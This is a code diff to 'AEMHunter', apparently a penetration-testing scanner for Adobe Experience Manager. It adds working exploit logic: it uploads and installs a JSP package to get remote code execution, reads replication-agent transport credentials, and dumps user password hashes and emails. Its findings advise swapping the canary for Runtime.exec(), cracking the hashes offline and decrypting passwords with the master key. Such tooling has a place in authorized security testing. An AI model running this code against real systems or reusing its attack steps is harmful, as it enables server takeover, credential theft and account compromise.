@@ -1033,6 +1033,8 @@ class AEMHunter:
         confirmed += int(self._escalate_crx_dav())
         confirmed += int(self._escalate_sling_write())
         self._harvest_secrets()
+        # Turn the confirmed READ into concrete, provable impact:
+        self._recover_credentials()
         if self.exploit:
             self._escalate_group_membership()
         elif confirmed:
@@ -1104,9 +1106,10 @@ class AEMHunter:
         if self._csrf_token:
             headers["CSRF-Token"] = self._csrf_token
 
-        self.logger.info("Attempting package upload+install RCE (canary JSP under /apps)...")
-        # Several upload conventions across AEM versions; install=true does it in one shot,
-        # then we also force an explicit install in case install=true was ignored.
+        self.logger.info("upload+install RCE: building vault pkg, uploading, installing, executing...")
+        upload_ok = False
+        install_resp = None
+        upload_status = "n/a"
         attempts = [
             ("/crx/packmgr/service.jsp",
              {}, {"cmd": "upload", "name": name, "force": "true", "install": "true"}),
@@ -1115,63 +1118,88 @@ class AEMHunter:
             ("/crx/packmgr/service/.json/etc/packages/%s/%s.zip" % (grp, name),
              {"cmd": "upload"}, {"force": "true", "install": "true"}),
         ]
-        executed = False
-        last = None
         for ep, params, data in attempts:
             files = {"package": (name + ".zip", zipbytes, "application/zip"),
                      "file": (name + ".zip", zipbytes, "application/zip")}
             up = self.client.post(ep, params=params, data=data, files=files, headers=headers)
-            last = up
-            # explicit install fallbacks (JSON service + legacy .jsp)
-            self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
-                             params={"cmd": "install"}, headers=headers)
-            self.client.post("/crx/packmgr/service.jsp",
-                             data={"cmd": "inst", "name": name, "group": grp}, headers=headers)
-            ex = self.client.get("/apps/aemhunter/poc.jsp")
-            if ex is not None and canary in (ex.text or ""):
-                executed = True
-                self.reporter.add(Finding(
-                    title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
-                    severity=SEV_CRITICAL, category=CAT_RCE,
-                    target=self.target + "/apps/aemhunter/poc.jsp",
-                    evidence=f"Uploaded+installed a content package containing a JSP and the "
-                             f"server executed it: {snippet(ex.text, 160)}",
-                    description=("END-TO-END RCE: this session uploaded and installed a content "
-                                 "package containing a JSP, and the server executed attacker Java "
-                                 "code. Full server compromise as the AEM service user. Swap the "
-                                 "canary for Runtime.exec() for OS command execution, or ship an "
-                                 "OSGi bundle (0ang3el/aem-rce-bundle) for a persistent web shell."),
-                    references=["https://github.com/0ang3el/aem-rce-bundle",
-                                "https://github.com/0ang3el/aem-hacker"],
-                    request=f"POST {ep} (multipart vault pkg w/ jcr_root/apps/aemhunter/poc.jsp, install=true) "
-                            f"then GET /apps/aemhunter/poc.jsp -> {canary}-<svcuser>",
-                    response_snippet=snippet(ex.text, 300), role=self.role,
-                ))
+            upload_status = getattr(up, "status_code", "ERR")
+            self.logger.debug(f"upload via {ep} -> {upload_status}: {safe_response_text(up, 120)}")
+            # Did the package actually land? Check the listing for our name.
+            ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
+            if self._pkg_success(up) or (ls2 and name in (ls2.text or "")):
+                upload_ok = True
+                # explicit install (in case install=true was ignored)
+                install_resp = self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
+                                                 params={"cmd": "install"}, headers=headers)
+                self.client.post("/crx/packmgr/service.jsp",
+                                 data={"cmd": "inst", "name": name, "group": grp}, headers=headers)
                 break
+
+        # Classify the result by fetching the JSP: executed / installed-but-source / not-written.
+        ex = self.client.get("/apps/aemhunter/poc.jsp")
+        ex_status = getattr(ex, "status_code", "ERR")
+        ex_body = (ex.text if ex is not None else "") or ""
+        if canary in ex_body:
+            jsp_state = "executed"
+        elif ex is not None and ex.status_code == 200 and ("<%" in ex_body or "System.getProperty" in ex_body):
+            jsp_state = "installed-but-not-executed"   # JSP written but served as source
+        elif ex is None or ex.status_code == 404:
+            jsp_state = "not-written"
+        else:
+            jsp_state = f"other(HTTP {ex_status})"
+
+        install_ok = self._pkg_success(install_resp)
 
         # thorough cleanup regardless of outcome
         self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"}, headers=headers)
         self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"}, headers=headers)
         self._auth_post("/apps/aemhunter", data={":operation": "delete"})
 
-        if not executed:
+        if jsp_state == "executed":
             self.reporter.add(Finding(
-                title=f"Package upload/install attempted — RCE NOT confirmed {self._role_tag()}",
-                severity=SEV_HIGH, category=CAT_RCE,
-                target=self.target + "/crx/packmgr/service.jsp",
-                evidence=f"Package Manager reachable as user={acting}; upload/install tried on "
-                         f"3 endpoints but the canary JSP did not execute (last upload status "
-                         f"{getattr(last, 'status_code', 'ERR')}).",
-                description=("The role can read Package Manager but uploading+installing a JSP "
-                             "package did not yield execution — likely lacks install rights or "
-                             "the package-manager service does not write /apps for this user. "
-                             "Next: try an OSGi-bundle package (0ang3el/aem-rce-bundle) dropped "
-                             "into /apps/<x>/install, or a writable /apps subpath. Manual review "
-                             "recommended — the read access alone (full repo + secrets) is "
-                             "already high impact."),
-                references=["https://github.com/0ang3el/aem-rce-bundle"],
-                response_snippet=safe_response_text(last, 300), role=self.role,
+                title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
+                severity=SEV_CRITICAL, category=CAT_RCE,
+                target=self.target + "/apps/aemhunter/poc.jsp",
+                evidence=f"Uploaded+installed a content package containing a JSP and the server "
+                         f"executed it: {snippet(ex_body, 160)}",
+                description=("END-TO-END RCE: uploaded and installed a content package containing "
+                             "a JSP and the server executed attacker Java code. Full server "
+                             "compromise as the AEM service user. Swap the canary for "
+                             "Runtime.exec() for OS command execution."),
+                references=["https://github.com/0ang3el/aem-rce-bundle",
+                            "https://github.com/0ang3el/aem-hacker"],
+                request="POST /crx/packmgr/service.jsp (multipart vault pkg, install=true) "
+                        "then GET /apps/aemhunter/poc.jsp -> canary",
+                response_snippet=snippet(ex_body, 300), role=self.role,
             ))
+            return
+
+        # Not executed — say exactly where it broke, so it's actionable.
+        if not upload_ok:
+            blocked = "UPLOAD denied — the role cannot upload packages (package service is read-only for it)"
+            nxt = "Package Manager is read-only for this role; RCE via packages is not available. Pivot to the READ-based impact (repo dump, replication creds, hashes)."
+        elif not install_ok and jsp_state == "not-written":
+            blocked = "INSTALL denied — package uploaded but install did not write /apps"
+            nxt = "Upload works but install/activate is blocked. Try an OSGi-bundle package dropped into /apps/<x>/install (JcrInstaller runs as system), or find a writable /apps subpath."
+        elif jsp_state == "installed-but-not-executed":
+            blocked = "JSP-EXEC blocked — the JSP installed under /apps but is served as source, not executed"
+            nxt = "Direct .jsp execution is disabled. Try a sling:resourceType script + a content node that renders it, or an OSGi-bundle package for code exec."
+        else:
+            blocked = f"unclear (upload_ok={upload_ok}, install_ok={install_ok}, jsp={jsp_state})"
+            nxt = "Manual review of the package-manager responses recommended (run with -v)."
+
+        self.reporter.add(Finding(
+            title=f"Package install RCE NOT achieved {self._role_tag()} — blocked at: {blocked.split(' —')[0]}",
+            severity=SEV_HIGH, category=CAT_RCE,
+            target=self.target + "/crx/packmgr/service.jsp",
+            evidence=f"user={acting} | upload_ok={upload_ok} (last status {upload_status}) | "
+                     f"install_ok={install_ok} | /apps/aemhunter/poc.jsp -> {jsp_state}",
+            description=(f"Package-manager RCE attempt result: {blocked}. Next: {nxt} "
+                         "Note: the confirmed READ access (full repo + secrets + replication "
+                         "creds + any user hashes) is already high, provable impact on its own."),
+            references=["https://github.com/0ang3el/aem-rce-bundle"],
+            response_snippet=safe_response_text(install_resp or ex, 300), role=self.role,
+        ))
 
     def _build_vault_package(self, group: str, name: str, files: Dict[str, str]) -> bytes:
         """Build a minimal FileVault content-package zip in memory."""
@@ -1385,6 +1413,103 @@ class AEMHunter:
                                  + "Harvest all such values for the report."),
                     response_snippet=f"{k}: {v[:120]}", role=self.role,
                 ))
+
+    # ---- Turn READ access into provable impact: creds + user dump ----
+    def _recover_credentials(self) -> None:
+        self._recover_replication_creds()
+        self._dump_users()
+
+    def _recover_replication_creds(self) -> None:
+        """Replication agents carry transport creds to the PUBLISH instance —
+        usually a high-priv account. Recovering them = lateral movement + likely
+        RCE on publish. This is concrete, provable impact from read access."""
+        rep_paths = [
+            "/etc/replication/agents.author.infinity.json",
+            "/etc/replication/agents.publish.infinity.json",
+            "/etc/replication.infinity.json",
+            "/etc/replication/agents.author.-1.json",
+        ]
+        seen: Set[Tuple[str, str]] = set()  # dedupe the same agent across overlapping paths
+        for p in rep_paths:
+            if len(seen) >= 10:
+                break
+            r = self.client.get(p)
+            if not (r and r.status_code == 200 and not self._is_authwall(r)
+                    and (r.text or "").lstrip().startswith("{")):
+                continue
+            body = r.text or ""
+            for m in re.finditer(r'"transportUri"\s*:\s*"([^"]+)"', body):
+                if len(seen) >= 10:
+                    break
+                uri = m.group(1)
+                window = body[max(0, m.start() - 600): m.end() + 600]
+                user = re.search(r'"transportUser"\s*:\s*"([^"]*)"', window)
+                pw = re.search(r'"transportPassword"\s*:\s*"([^"]*)"', window)
+                uval = user.group(1) if user else "?"
+                pval = pw.group(1) if pw else ""
+                key = (uri, uval)
+                if key in seen:
+                    continue
+                seen.add(key)
+                self.reporter.add(Finding(
+                    title=f"Replication transport credentials readable {self._role_tag()} — lateral move to publish",
+                    severity=SEV_CRITICAL, category=CAT_DISCLOSURE, target=self.target + p,
+                    evidence=f"transportUri={uri} | transportUser={uval} | "
+                             f"transportPassword={(pval[:28] + '...') if pval else '(empty)'}",
+                    description=("A replication agent's transport credentials are readable. These "
+                                 "authenticate the author to the PUBLISH instance (and dispatcher "
+                                 "flush), frequently as a high-privilege/admin account — so this is "
+                                 "direct lateral movement and a likely path to RCE on publish. "
+                                 "Encrypted {...} passwords can be replayed through the agent or "
+                                 "decrypted with the /etc/key master key."),
+                    response_snippet=snippet(window, 300), role=self.role,
+                ))
+
+    def _dump_users(self) -> None:
+        """Enumerate users / grab any leaked password hashes from readable /home."""
+        sources = [
+            ("/bin/querybuilder.json?path=/home/users&type=rep:User&p.hits=full&p.limit=500"
+             "&p.properties=rep:authorizableId%20rep:principalName%20rep:password%20profile/email", "querybuilder"),
+            ("/home/users.infinity.json", "sling-json"),
+        ]
+        for url, how in sources:
+            r = self.client.get(url)
+            if not (r and r.status_code == 200 and not self._is_authwall(r)):
+                continue
+            body = r.text or ""
+            hashes = re.findall(r'"rep:password"\s*:\s*"([^"]+)"', body)
+            ids = sorted(set(re.findall(r'"rep:authorizableId"\s*:\s*"([^"]+)"', body)))
+            emails = sorted(set(re.findall(r'"email"\s*:\s*"([^"@]+@[^"]+)"', body)))
+            if hashes:
+                self.reporter.add(Finding(
+                    title=f"User password HASHES dumped {self._role_tag()} — {len(hashes)} hashes (offline-crackable)",
+                    severity=SEV_CRITICAL, category=CAT_DISCLOSURE,
+                    target=self.target + url.split("?")[0],
+                    evidence=f"Recovered {len(hashes)} rep:password hashes via {how}. "
+                             f"Sample: {hashes[0][:48]}...",
+                    description=("rep:password hashes for AEM users are readable. Crack them "
+                                 "offline (they are typically salted SHA-256) to take over "
+                                 "accounts — including potentially admin. Definitive, provable "
+                                 "impact."),
+                    response_snippet="; ".join(h[:40] for h in hashes[:5]), role=self.role,
+                ))
+                return
+            if ids or emails:
+                n = max(len(ids), len(emails))
+                self.reporter.add(Finding(
+                    title=f"User enumeration {self._role_tag()} — {n} users readable (no hashes exposed)",
+                    severity=SEV_HIGH, category=CAT_DISCLOSURE,
+                    target=self.target + url.split("?")[0],
+                    evidence=f"{len(ids)} authorizableIds, {len(emails)} emails via {how}. "
+                             f"Sample: {', '.join((ids or emails)[:8])}",
+                    description=("The entire user directory is readable (PII: usernames/emails). "
+                                 "rep:password is protected from this view, but a FileVault export "
+                                 "of /home/users via the CRX DavEx server (already confirmed "
+                                 "readable) does include the hashes — pull it manually to escalate "
+                                 "to a full hash dump."),
+                    response_snippet="; ".join((ids or emails)[:20]), role=self.role,
+                ))
+                return
 
     # ---- Group-membership escalation (exploit only, best-effort, verified) ----
     def _escalate_group_membership(self) -> None:
